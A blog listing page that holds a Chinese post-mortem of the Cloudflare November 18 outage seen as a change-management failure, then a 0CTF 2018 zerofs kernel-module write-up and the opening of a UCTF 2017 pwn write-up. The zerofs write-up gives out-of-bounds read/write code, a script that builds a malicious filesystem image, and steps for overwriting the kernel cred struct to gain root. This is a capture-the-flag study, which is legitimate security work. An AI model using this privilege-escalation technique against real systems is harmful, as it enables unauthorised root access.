<p><code>unwrap</code> 确实是这次事故的重要触发点之一，但如果只停留在“不要乱用 unwrap”这个层面，我们能学到的东西其实很有限。<strong>在真实的工程环境里，数据库权限、配置项、安全策略，这类“看起来只是调一下配置”的变更，在研发和安全团队的日常工作中非常常见，而且数量巨大</strong>。很多时候，它们并不会被当成高风险操作对待，更不会被放到和“发一版代码”同等严肃的变更流程里去审视。</p>
<p>正因为如此，在大家都在吐槽 <code>unwrap</code> 的时候，我更想换一个视角：站在一个局外人的位置，只基于 Cloudflare 公开的技术文章，<strong>从“变更”的角度，来看看这次事故里有哪些稳定性和安全运维层面的经验教训，是我们在日常做配置 / 安全控制变更时可以借鉴的</strong>。</p>
<h2 id="2-事件回顾和-Cloudflare-的技术报告"><a href="#2-事件回顾和-Cloudflare-的技术报告" class="headerlink" title="2. 事件回顾和 Cloudflare 的技术报告"></a>2. 事件回顾和 Cloudflare 的技术报告</h2><p>在进入后面的讨论之前，我先按照 Cloudflare 官方技术文章里的信息，把这次故障的经过简单串一下。几个关键时间点（UTC）：</p>
<ul>
<li><strong>11:05</strong>：数据库访问控制变更部署</li>
<li><strong>11:28</strong>：影响开始产生（Impact starts）</li>
<li><strong>13:05</strong>：对 Workers KV / Access 启用 bypass，影响降低</li>
<li><strong>13:37</strong>：确认 Bot Management 配置文件为触发点，开始回滚/修复至 last-known-good</li>
<li><strong>14:30</strong>：主要影响解除（Main impact resolved）</li>
<li><strong>17:06</strong>：所有服务恢复（All services resolved）</li>
</ul>
<p>在这个时间线里，Cloudflare 官方给出的故事大致可以拆成以下几步。</p>
<h3 id="2-1-起点：数据库访问控制变更（11-05-UTC）"><a href="#2-1-起点：数据库访问控制变更（11-05-UTC）" class="headerlink" title="2.1 起点：数据库访问控制变更（11:05 UTC）"></a>2.1 起点：数据库访问控制变更（11:05 UTC）</h3><p>从官方时间线来看，这次事故的起点很清晰：<strong>11:05 UTC，Cloudflare 在一套用于生成 Bot Management 特征配置的数据库上，部署了一次权限相关的配置变更（database access control change）。</strong></p>
<p>Cloudflare 在复盘里解释，这次变更的初衷是：</p>
<ul>
<li>把原本“隐式”的表访问权限改成“显式授权”，</li>
<li>让分布式查询可以在真实用户账户而不是共享系统账户下执行，</li>
<li>这样才能对每个用户的查询更细粒度地评估访问授权和查询限额（access grants / query limits），从安全和资源控制角度把关。</li>
</ul>
<p>问题在于：生成 Bot Management <strong>feature file（特征配置文件）</strong> 的那条查询并没有显式区分哪些库/表应该被统计进去。变更生效后，这条查询突然多拿到了一批原本不会出现的信息，导致：</p>
<ul>
<li>查询结果的行数接近翻倍；</li>
<li>按这个结果生成的 feature file 体积也明显变大，特征数量远超正常水平；</li>
<li>这份“变胖了”的配置文件依然按原有节奏在全网周期性刷新和分发。</li>
</ul>
<p>就变更本身来说，它在当时<strong>看上去更像是一条常规的权限/安全配置调整</strong>，而不是那种一眼就会被当作“高危大变更”的架构级操作。</p>
<h3 id="2-2-症状出现：核心流量异常（11-28-UTC-之后）"><a href="#2-2-症状出现：核心流量异常（11-28-UTC-之后）" class="headerlink" title="2.2 症状出现：核心流量异常（11:28 UTC 之后）"></a>2.2 症状出现：核心流量异常（11:28 UTC 之后）</h3><p>官方文章在 “The outage” 一节里，展示了一张 5xx 错误量曲线图：原本很低的错误率在 11 点多突然抬升，并出现一段时间的反复波动。</p>
<p>在文章末尾的时间线表中，<strong>11:28</strong> 被标记为：</p>
<blockquote>
<p>Impact starts. Deployment reaches customer environments, first errors observed on customer HTTP traffic.</p>
</blockquote>
<p>对外部用户来说，这一阶段的直接表现就是：</p>
<ul>
<li>大量站点返回 Cloudflare 自己的 5xx 错误页；</li>
<li>Workers KV、Access、Dashboard、Turnstile 等依赖核心代理（Cloudflare 文中称为 core proxy，并用 FL/FL2 指代其不同代际/版本的核心代理组件）的服务出现错误或不可用；</li>
<li>整体 HTTP 流量表现为“时好时坏”的波动。</li>
</ul>
<p>波动的原因在官方报告里也解释得比较清楚：</p>
<ul>
<li>feature file 每几分钟重新生成一次并分发到全网；</li>
<li>ClickHouse 集群在逐步更新，只有已经应用访问控制变更的节点会生成“坏文件”；</li>
<li>每一轮刷新，有可能生成“好配置”或“坏配置”，然后快速推送，导致系统在“好文件 / 坏文件”之间反复切换。</li>
</ul>
<h3 id="2-3-定位过程：收敛到数据库-权限策略与-Bot-Management-特征文件（11-28–14-30-UTC）"><a href="#2-3-定位过程：收敛到数据库-权限策略与-Bot-Management-特征文件（11-28–14-30-UTC）" class="headerlink" title="2.3 定位过程：收敛到数据库 / 权限策略与 Bot Management 特征文件（11:28–14:30 UTC）"></a>2.3 定位过程：收敛到数据库 / 权限策略与 Bot Management 特征文件（11:28–14:30 UTC）</h3><p>时间线显示，<strong>11:32–13:05</strong> 这段时间里，团队最初是沿着 <strong>Workers KV 错误和高流量</strong> 的症状在排查：</p>
<blockquote>
<p>“The team investigated elevated traffic levels and errors to Workers KV service… mitigations such as traffic manipulation and account limiting were attempted…”</p>
</blockquote>
<p>随着排障推进，Cloudflare 在 “The query behaviour change” 与 “Memory preallocation” 两节中，把技术链路写得很直白：</p>
<ol>
<li><strong>数据库层</strong>：访问控制变更后，查询时多返回了数据，响应行数接近翻倍；</li>
<li><strong>配置生成层</strong>：用这条查询生成的 Bot Management feature file 跟着“变胖”，特征数量远超平时（文中描述为 “effectively more than doubling the rows in the response ultimately affecting the number of rows (i.e. features) in the final file output”）；</li>
<li><strong>核心代理层</strong>：core proxy 上的 Bot Management 模块，为了预分配内存和防止无界增长，对特征数量设了一个硬上限（200，正常使用约 60）；</li>
<li><p>当超大 feature file 触发这个上限时，核心组件 FL2 的 Rust 代码在检查时调用了 <code>unwrap()</code>，在 Err 分支 panic：</p>
<blockquote>
<p>thread fl2_worker_thread panicked: called Result::unwrap() on an Err value</p>
</blockquote>
</li>
</ol>
<p>时间线中，<strong>13:37</strong> 这一行直接写道：</p>
<blockquote>
<p>Work focused on rollback of the Bot Management configuration file to a last-known-good version. We were confident that the Bot Management configuration file was the trigger for the incident.</p>
</blockquote>
<p>也就是说，到 13:37 前后，团队已经把问题清楚地收敛到这一链路上：</p>
<blockquote>
<p>数据库访问控制变更 → 查询行为变化 → feature file 异常膨胀 → Bot Management 模块触发 unwrap() panic → 核心代理返回大规模 5xx。</p>
</blockquote>
<h3 id="2-4-处置与恢复：回滚配置与重启服务（13-05–17-06-UTC）"><a href="#2-4-处置与恢复：回滚配置与重启服务（13-05–17-06-UTC）" class="headerlink" title="2.4 处置与恢复：回滚配置与重启服务（13:05–17:06 UTC）"></a>2.4 处置与恢复：回滚配置与重启服务（13:05–17:06 UTC）</h3><p>后续的处置流程在官方时间线里也有完整记录，可以粗略分成三段：</p>
<ol>
<li><strong>先压住影响面（13:05 起）</strong><ul>
<li><strong>13:05</strong>：<blockquote>
<p>Workers KV and Cloudflare Access bypass implemented — impact reduced.</p>
</blockquote>
</li>
<li>做法是通过内部 bypass，让 Workers KV 和 Access 回退到 core proxy 的旧版本，虽然旧版本同样存在问题，但影响范围和程度都更小，因此整体错误率明显下降。</li>
</ul>
</li>
<li><strong>修配置文件，恢复核心流量（13:37–14:30）</strong><ul>
<li><strong>13:37</strong>：工作重点转向回滚 Bot Management 配置文件到 last-known-good 版本；</li>
<li><strong>14:24</strong>：<ul>
<li>停止生成与分发新的 Bot Management 配置文件；</li>
<li>使用旧版本配置文件的恢复测试完成；</li>
</ul>
</li>
<li><strong>14:30</strong>：<blockquote>
<p>Main impact resolved. A correct Bot Management configuration file was deployed globally and most services started operating correctly.</p>
</blockquote>
</li>
</ul>
</li>
<li><strong>清理长尾，全部恢复（14:30–17:06）</strong><ul>
<li>核心流量恢复后，剩下的是重启在事故中进入 bad state 的下游服务；</li>
<li><strong>17:06</strong> ：<blockquote>
<p>All services resolved. Impact ends. All downstream services restarted and all operations fully restored.</p>
</blockquote>
</li>
</ul>
</li>
</ol>
<p>到这里为止，官方技术报告给出的“工程师视角故事线”就完整了：</p>
<ul>
<li>11:05 的数据库访问控制变更改变了系统表查询行为；</li>
<li>被用于生成 Bot Management 特征配置文件的查询没有过滤 database，导致配置文件异常膨胀；</li>
<li>核心代理中的 Bot Management 模块在遇到这份“超大配置”时触发 <code>unwrap()</code> panic，引发大规模 5xx；</li>
<li>通过 bypass 降低影响面、回滚 / 修复配置文件、重启下游服务，在 14:30 解除主体影响，17:06 完成收尾。</li>
</ul>
<hr>
<p>到这里为止，我只是把 Cloudflare 在官方复盘里公开的内容，整理成了一条相对清晰的时间线和技术链路。换句话说：前面的所有事实，都是从那篇博客和时间线表里来的，我并没有也不可能掌握他们内部更多的细节。</p>
<p>接下来如果从变更和稳定性体系的角度往下展开，就难免会带一点推断和类比。这些推断<strong>有可能和 Cloudflare 内部当时的真实情况并不完全一致</strong>，也不代表我在评价或还原他们的具体决策过程，更谈不上指责。</p>
<p>更合适的理解是：把这次事故当成一个公开、细节足够丰富的案例，把官方给出的时间线和技术原因当作“题面”，后面的分析只是借这道题来反思我们自己在变更、稳定性上的潜在问题，看看能从中抽象出哪些对自己有用的经验教训。后文更关注机制与流程如何把风险收住，而不是复盘某个具体个人/团队的对错。</p>
<h2 id="3-从变更视角看这次故障"><a href="#3-从变更视角看这次故障" class="headerlink" title="3. 从变更视角看这次故障"></a>3. 从变更视角看这次故障</h2><p>大家都在讨论 <code>unwrap</code>、错误处理不健壮，但真正把这一串问题引爆的，是一类我们日常也经常做的事情——<strong>改了一条权限 / 策略 / 配置</strong>。</p>
<p>这类操作在任何公司都很常见：收紧一下权限、加一条安全规则、改一条控制面配置。平时我们可能把它归类成“小变更”。这次事故对我们来说，也是一个“复盘”自查的机会，可以就把它当成一次典型的<strong>高危配置 / 安全策略变更事故</strong>，按变更的几个阶段回头看看：如果同样的事发生在我们系统里，哪些环节我们自己也容易掉链子。</p>
<p>下面这些都是站在“做事的人”的角度做的“复盘”与自查，不是去评价 Cloudflare 做得好不好。</p>
<h3 id="3-1-影响面评估：这次变更到底多“高危”"><a href="#3-1-影响面评估：这次变更到底多“高危”" class="headerlink" title="3.1 影响面评估：这次变更到底多“高危”"></a>3.1 影响面评估：这次变更到底多“高危”</h3><p>先看第一步：这次到底改了个什么东西。</p>
<p>这一类权限 / 策略变更，在日常开发里，很容易被当成“就改一下配置”——不改代码、不发新版本，只是调整一条规则，看起来像是低风险操作。</p>
<p>评估风险大小至少可以拆成两个维度：</p>
<ol>
<li><strong>所处平面和作用域（它在哪一层）</strong><ul>
<li>是某个单体服务的本地配置，只影响局部行为；</li>
<li>还是控制面 / 安全面上的全局策略，例如：认证授权、集中配置、路由 / 流量调度这类“公共基础设施”。</li>
</ul>
</li>
<li><strong>依赖关系和影响链路（后面连着谁）</strong><ul>
<li>有多少关键服务 / 关键路径依赖这条配置 / 策略才能继续往下走；</li>
<li>它是不是在多条核心链路上的必经节点，是典型的 critical path / chokepoint 还是一个 leaf node。</li>
</ul>
</li>
</ol>
<p>Cloudflare 这次动的是核心组件访问数据的权限，从复盘描述看，很难把它归类成一个“局部、低影响的本地配置”。在任何一个复杂系统里，这种“全局共享 + 被关键链路反复访问”的配置，按理都应该直接归到高危变更的范畴。</p>
<p>现实里又有另一个情况：历史系统经过多年演化，上下游依赖关系复杂。但我觉得这时候，仍然有必要做一些自查，多思考几个问题，比如：</p>
<ul>
<li>如果这个配置完全失效，用户侧最直观的症状会是什么，最坏情况下，它会导致什么样的影响？</li>
<li>有哪些关键服务 / 功能一定要依赖这条配置？</li>
<li>过去的故障 / 变更记录里，有没有跟它相关的坑？</li>
</ul>
<p>如果这些问题都答不出一个相对有把握的结论，并不代表这个变更风险就低，反而说明：</p>
<p>我们现在对它的影响面认知还不够清晰，这种情况下，把它当成“小配置改动”随手上生产，其实是比较危险的。</p>
<h3 id="3-2-事前验证：先在可控环境里把“正常”和“异常”都走一遍"><a href="#3-2-事前验证：先在可控环境里把“正常”和“异常”都走一遍" class="headerlink" title="3.2 事前验证：先在可控环境里把“正常”和“异常”都走一遍"></a>3.2 事前验证：先在可控环境里把“正常”和“异常”都走一遍</h3><p>如果可以在一个安全的测试环境里先行验证，有可能先暴露这个问题。</p>
<p>有些人平时做配置 / 策略变更，习惯往往是很简单的：</p>
<p>改完之后在控制台点两下、跑一跑页面，发现“看起来还能用”，然后就上生产了。</p>
<p>如果事先没认真在测试环境里验证一遍，直接上生产环境变更就等于是给未知行为兜底。</p>
<p>对这类高危变更：</p>
<ul>
<li>上生产之前，先在测试 / 预发环境完成测试，如果是阻断策略，也可以通过日志观察比对验证；</li>
<li>在这个过程中，不需要穷举所有异常，但至少要有意识地想一想、看一看：<ul>
<li>配置 / 策略拿不到、读错了、大致会长成什么样；</li>
<li>系统在这种情况下，是还能撑住，还是直接炸掉。</li>
</ul>
</li>
</ul>
<p>大规模系统里，确实不可能在测试环境推演所有坏情况，这个目标本身就不现实。</p>
<p>但在上生产之前，至少要做一件事：<strong>不要把“配置 / 策略永远没问题”当成默认前提</strong>，而是先在一个相对安全的环境里，确认一下最基本的正常和异常场景，是否符合预期。</p>
<h3 id="3-3-灰度：别一上来就全网生效"><a href="#3-3-灰度：别一上来就全网生效" class="headerlink" title="3.3 灰度：别一上来就全网生效"></a>3.3 灰度：别一上来就全网生效</h3><p>即使测试 / 预发环境都跑过了，生产一定会面临更复杂的情况：真实数据、边缘场景、奇怪的调用链、历史遗留配置，都会叠加进来。所以有计划的分批次灰度发布非常重要。几种比较常见、也比较实用的手法：</p>
<ul>
<li><strong>按范围灰度</strong><ul>
<li>按 Region / 机房 / 用户群 / 业务线分批；</li>
<li>第一批尽量选影响范围小、可观测性好的对象。</li>
</ul>
</li>
<li><strong>先监控，再执行</strong><ul>
<li>安全策略先以 log-only / monitor-only 的方式 dry run 跑一段时间：<ul>
<li>记录“如果现在真执行，会拦掉哪些请求”；</li>
<li>统计“会放过哪些我们不希望放过的请求”；</li>
</ul>
</li>
<li>没有明显问题，再切到 enforce 模式。</li>
</ul>
</li>
<li><strong>做好灰度计划</strong><ul>
<li>提前定好：灰度的批次，达到什么要求，我们就可以往下放一批；</li>
</ul>
</li>
</ul>
<p>其实很多时候问题不是“没做灰度”，而是这类配置 / 策略从设计第一天起，就没有灰度控制的能力。当然，如果某条配置一上来就只能全局生效，而且它又处在核心链路，那它本身就是一个需要去解决的技术债。</p>
<h3 id="3-4-观测能力与跨部门协同：让影响可见可止血"><a href="#3-4-观测能力与跨部门协同：让影响可见可止血" class="headerlink" title="3.4 观测能力与跨部门协同：让影响可见可止血"></a>3.4 观测能力与跨部门协同：让影响可见可止血</h3><p>出问题这件事本身很难完全避免，那接下来就看两件事：</p>
<ol>
<li>出了问题，能不能被及时观测到，并且尽快把异常与本次变更关联起来；</li>
<li>能不能快速拉齐相关方，迅速止血。</li>
</ol>
<p><strong>变更发起者（变更 owner）需要对此负责</strong>，对高危配置 / 策略变更来说，变更 owner 的责任不只是“把变更改对”，而是要在发起变更之前，就把下面两点想清楚、准备好，并落在 SOP 中：</p>
<ul>
<li>如何判断这次变更是否按预期生效、有没有带来额外副作用；</li>
<li>一旦出现异常，应该如何处置，触发什么条件需要回滚或熔断。</li>
</ul>
<h3 id="3-4-1-观测：变更-owner-要先把观测指标定好"><a href="#3-4-1-观测：变更-owner-要先把观测指标定好" class="headerlink" title="3.4.1 观测：变更 owner 要先把观测指标定好"></a>3.4.1 观测：变更 owner 要先把观测指标定好</h3><p>业务侧的观测一般比较完备。但变更的 owner 并不一定有如同业务一样完备的观测能力和视角。<strong>变更 owner 需要在变更执行前，把与本次变更直接相关的观测能力先对齐好</strong>。对于 SRE、安全这类跨多方的变更，这个过程往往离不开跨部门协同。</p>
<p>可以具体拆成几件事：</p>
<ol>
<li><strong>先列清楚：这次变更可能影响哪些链路、哪些指标</strong><ul>
<li>我改的是一条安全策略 / 配置规则，它会作用在：<ul>
<li>哪些入口（网关、CDN、API 网关…）；</li>
<li>哪些下游（认证、业务服务、数据库 / 缓存…）；</li>
<li>哪些用户 / 租户 / 区域。</li>
</ul>
</li>
<li>对每一类影响，预先想一遍：<ul>
<li>正常情况下，哪些指标会有轻微波动（例如某类请求被拒绝率小幅上升）；</li>
<li>异常情况下，哪些指标会率先发生明显异常（例如某几个接口 5xx 暴涨）。</li>
</ul>
</li>
</ul>
</li>
<li><strong>与上下游一起梳理异常观测指标和告警信号</strong><ul>
<li>在发起变更前，变更 owner 主动与相关方对齐两类信息：<ul>
<li>各方现有的关键观测指标和告警规则：出现异常时优先关注哪些 dashboard / 告警；</li>
<li>在变更相关的日志 / 指标里，是否需要增加哪些字段，以便后续快速按维度筛查。</li>
</ul>
</li>
<li>理想的状态是：<ul>
<li>在变更 owner 自己的 dashboard 里，可以看到这次变更涉及的上下游关键指标；</li>
<li>所有人都清楚“这次变更要重点盯哪几个指标、哪些异常信号一出现就需要进入处置流程”。</li>
</ul>
</li>
</ul>
</li>
<li><strong>在监控 / 日志里给变更本身留“痕迹”</strong><ul>
<li>相应的变更系统，至少要做到：<ul>
<li>能够区分不同的配置 / 策略版本；</li>
<li>能够在日志或查询里，把“使用新配置 / 新策略”的请求、租户、区域筛选出来。</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>回到这次故障上，本身系统的观测也是有一定问题的，<code>unwrap</code> 导致panic级别的问题应该被捕获并且告警。但如果变更 owner 可以多想多做几步，或许能够更快速地把故障指征归因到他的变更上。</p>
<h3 id="3-4-2-响应协同：以快速止血为目标"><a href="#3-4-2-响应协同：以快速止血为目标" class="headerlink" title="3.4.2 响应协同：以快速止血为目标"></a>3.4.2 响应协同：以快速止血为目标</h3><p>这次 Cloudflare 故障，从业务异常到定位到特定权限 / 特征文件变更导致的问题，过程拉得很长，很可能的原因是，变更信息没有在上下游充分同步，处置现场一开始也没有足够意识到“这波异常和哪一次变更高度相关”。</p>
<p>从变更 owner 的视角，可以关注以下几点：</p>
<ol>
<li><strong>变更的“共同上下文”要统一</strong><ul>
<li>每一次高危变更都要有明确的变更 ID / 版本号 / 影响范围（租户、区域、实例批次等），确保上下游知晓；</li>
</ul>
</li>
<li><strong>定义好 SOP，关键指标要提前对齐好</strong><ul>
<li>结合上文对齐好的观测指标，提前约定好异常指标出现后的处置动作。</li>
<li>快速恢复动作尽量简单：先按预案降级或回滚，优先保障可用性，安全 / 合规问题通过后续补偿措施兜底。</li>
</ul>
</li>
<li><strong>降级/熔断设计</strong> <ul>
<li>临时关闭某个依赖路径，不再调用这条有问题的链路；</li>
<li>将某些策略从“强制阻断”降级为“仅记录 + 限流”；</li>
<li>对下游返回一个可预期的降级结果，而不是继续把异常往更深的地方传。</li>
</ul>
</li>
<li><strong>恢复链路尽量简单，避免循环依赖</strong><ul>
<li>典型的循环依赖场景：<ul>
<li>回滚配置要通过同一套控制面 / 配置系统下发，而这套控制面此刻就因为这次变更不可用；</li>
<li>执行回滚需要某些权限 / 认证链路，碰巧这次改的就是这层；</li>
<li>回滚脚本依赖的一些后端服务也在故障链路里，导致脚本半路就跑挂了。</li>
</ul>
</li>
</ul>
</li>
<li><strong>通过演练把这一套联动跑顺</strong><ul>
<li>围绕典型高危变更，进行演练。演练不只是看“回滚脚本能不能跑通”。而是验证 SOP 中的观测指标能否与故障场景关联，并及时发起恢复操作。</li>
<li>演练暴露出来的缺口，都应该复盘更新到 SOP 里。</li>
</ul>
</li>
</ol>
<h2 id="4-写在最后"><a href="#4-写在最后" class="headerlink" title="4. 写在最后"></a>4. 写在最后</h2><p>首先要给 Cloudflare 点个赞：愿意把问题摊开、把细节讲清楚，是一种非常好的文化。对我们这些旁观者来说，这样的复盘既能照出问题，也能当作一次很好的演练材料。</p>
<p>在这种上下游链路极其复杂的系统里，一条变更真正会影响什么，很难提前预判。跨部门变更管理、观测、响应尤为重要。这类跨域风险，往往需要横向团队做中枢。</p>
<p>尤其是对偏上游的同学来说，比如安全运营、策略平台，日常做的很多事情看上去只是“调一条规则”“收紧一点权限”，但站在全局视角，往往就是高风险动作。不要把配置、权限、策略当成理所当然“安全”的东西。如何在团队里把风险意识、影响面判断、事前预案这些东西沉淀成可复制的能力，而不是只靠少数人的经验，需要长期系统性地建设。</p>

                    
                        


                    
                    
                        <p>
                            <a
                                href="/uncategorized/cloudflare-nov-18-outage-change-perspective/#post-footer"
                                class="postShorten-excerpt_link link"
                                aria-label=""
                            >
                                Comment and share
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title">
                    
                        <a
                            class="link-unstyled"
                            href="/writeups/0ctf-2018-zerofs-writeup/"
                            aria-label=": 0CTF2018 zerofs Writeup"
                        >
                            0CTF2018 zerofs Writeup
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time datetime="2018-04-03T00:15:39+08:00">
	
		    Apr 03, 2018
    	
    </time>
    
        <span>in </span>
        
    <a class="category-link" href="/categories/writeups/">writeups</a>


    
</div>

            </div>
            
                <div class="postShorten-content">
                    <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p><em>zerofs.ko</em> is a driver module of a custom filesystem.<br>The kernel and the module is compiled by randstruct plugin, which I found in the magic string – <code>vermagic=4.13.0 SMP mod_unload modversions</code>RANDSTRUCT_PLUGIN_3c73df5cc8285309b74c8a4caaf831205da45096402d3b1a80caab1d7fa1b03a`.<br><em>run.sh</em> and <em>/init</em> show that the kernel is protected by SMEP, SMAP, KASLR, kptr_restrict and dmesg_restrict.</p>
<h2 id="zerofs-ko"><a href="#zerofs-ko" class="headerlink" title="zerofs.ko"></a>zerofs.ko</h2><p>I found the module may be modified from <a href="https://github.com/psankar/simplefs" target="_blank" rel="noopener">simplefs</a> after the game.<br>By reversing <em>zerofs.ko</em>, I knew the blocksize is 4096 bits. The first block of the image is the superblock. It consists of magic, block_size, inode_count and free_blocks bitmap.</p>
<img src="/writeups/0ctf-2018-zerofs-writeup/zerofs_super_block.png" title="zerofs_super_block">
<p>The second block records all of the inodes in an array. <em>ino</em> is inode number, and dno is the block number of the image.</p>
<img src="/writeups/0ctf-2018-zerofs-writeup/zerofs_inode.png" title="zerofs_inode">
<p>There is a root inode which ino is 1. It indicates the root dictionary. There is a block corresponding to root dictionary to indicates files in the dictionary. It is an array of zerofs_dir_record structure. </p>
<img src="/writeups/0ctf-2018-zerofs-writeup/zerofs_dir_record.png" title="zerofs_dir_record">
<h2 id="Vulnerabilitie"><a href="#Vulnerabilitie" class="headerlink" title="Vulnerabilitie"></a>Vulnerabilitie</h2><p>There isn’t any bound or size check in read and write function.<br>If the filesize we set in image is bigger than blocksize(0x1000), there will be an out-of-bound read/write when invoking copy_to_user/copy_from_user.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">zerofs_read</span><span class="params">(file *filp, <span class="keyword">char</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *ppos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> ( copy_to_user(buf, &amp;bh0-&gt;b_data[*pos_1], len_1) ) <span class="comment">// OOB READ</span></span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;    </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">zerofs_write</span><span class="params">(file *filp, <span class="keyword">const</span> <span class="keyword">char</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *ppos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(&amp;bh0-&gt;b_data[*pos], buf, len_1) ) <span class="comment">// OOB WRITE</span></span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Constructing-Image"><a href="#Constructing-Image" class="headerlink" title="Constructing Image"></a>Constructing Image</h2><p>To exploit the vulnerabilities, I need to construct an malicious image. Here is the script. I put a file named <em>666</em> with size of 0xffffffffffffffff.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">block0 = p64(<span class="number">0x4F52455A</span>) + p64(<span class="number">4096</span>) + p64(<span class="number">3</span>) + p64(<span class="number">0xffffffff</span> ^ <span class="number">0x7</span>)</span><br><span class="line">block0 = block0.ljust(<span class="number">0x1000</span>, <span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">block1 = <span class="string">''</span></span><br><span class="line">inode1 = p64(<span class="number">1</span>) + p64(<span class="number">2</span>) + p64(<span class="number">0x4000</span>) + p64(<span class="number">0x1</span>)</span><br><span class="line">inode2 = p64(<span class="number">2</span>) + p64(<span class="number">3</span>) + p64(<span class="number">0x8000</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">block1 += inode1 + inode2</span><br><span class="line">block1 = block1.ljust(<span class="number">0x1000</span>, <span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">block2 = <span class="string">''</span></span><br><span class="line">block2 += <span class="string">'666'</span>.ljust(<span class="number">256</span>, <span class="string">'\x00'</span>)</span><br><span class="line">block2 += p64(<span class="number">2</span>)</span><br><span class="line">block2 = block2.ljust(<span class="number">0x1000</span>, <span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">img = block0 + block1 + block2 + <span class="string">'\x30'</span> * <span class="number">0x1000</span> * <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'fs/tmp/zerofs.img'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(img)</span><br></pre></td></tr></table></figure>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>After mounting the image, I could trigger out-of-bound read by read the file <em>666</em>.<br>I tried to find CRED struct in leaked memory. Fortunately, I found some by searching the uid. It took me some time to locate CRED struct because of the radomization of structures.</p>
<p>I still didn’t know which CRED is valid and which process the CRED belongs to although I could find some CRED structures. The exploit is not stable, so I run the exploit serval times. After leaking the memory, the exploit will check if it gets root privilege in a loop. If so, it invokes <code>system(&quot;sha256sum /root/flag&quot;);</code>.</p>
<p>The last step is to write the CRED. I invoked llseek to set offset to the CRED, and invoked write to modify the CRED, setting uid to 0.</p>
<p>Here is the <a href="https://gist.github.com/Eadom/29f8627d428a90842a99b2c176d4789a" target="_blank" rel="noopener">expliot</a></p>
<img src="/writeups/0ctf-2018-zerofs-writeup/get_flag.png" title="get_flag">

                    
                        


                    
                    
                        <p>
                            <a
                                href="/writeups/0ctf-2018-zerofs-writeup/#post-footer"
                                class="postShorten-excerpt_link link"
                                aria-label=""
                            >
                                Comment and share
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title">
                    
                        <a
                            class="link-unstyled"
                            href="/writeups/uctf-2017-quals-pwn-writeup/"
                            aria-label=": UCTF2017 初赛 PWN题 Writeup"
                        >
                            UCTF2017 初赛 PWN题 Writeup
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time datetime="2017-07-10T16:44:39+08:00">
	
		    Jul 10, 2017
    	
    </time>
    
        <span>in </span>
        
    <a class="category-link" href="/categories/writeups/">writeups</a>


    
</div>

            </div>
            
                <div class="postShorten-content">
                    <blockquote>
<p>题目中上，但各种乱象毁了这个比赛。</p>
</blockquote>
<h2 id="NotFormat"><a href="#NotFormat" class="headerlink" title="NotFormat"></a>NotFormat</h2><h3 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h3><p>程序是静态链接的，利用缓解机制只启用了NX,程序只是一个简单的读取输入并返回。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> checksec NotFormat</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE</span><br></pre></td></tr></table></figure>
